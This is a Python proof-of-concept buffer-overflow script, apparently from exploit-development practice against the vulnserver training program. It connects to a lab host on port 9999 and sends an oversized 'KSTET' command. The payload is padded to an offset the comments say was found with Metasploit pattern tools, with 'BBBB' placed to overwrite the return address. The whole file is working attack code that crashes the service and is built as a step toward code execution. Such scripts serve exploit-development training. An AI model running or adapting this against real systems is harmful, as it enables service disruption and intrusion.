#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM
from struct import pack
from sys import exit

verbose = False
rhost = "172.16.153.130"
rport = 9999
target = (rhost, rport)

# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 5000 -q 41326341
# [*] Exact match at offset 66
buff = "A" * 66
buff += "BBBB"
buff += "C" * (5000 - 4 - 66)

if __name__ == '__main__':
    print('[+] creating payload')
    payload = "KSTET /.:/{buff}\r\n".format(buff=buff)
    if verbose:
        print('[*] payload:\n\t{payload}'.format(payload=payload))
    print('[+] connecting to target')
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(target)
    print('[+] checking for welcome message')
    msg = s.recv(1024)
    print('[+] received welcome message')
    if verbose:
        print('[*] welcome message: {msg}'.format(msg=msg))
    print('[+] sending payload')
    s.send(payload)
    print('[+] payload sent, cleaning up')
    s.close()

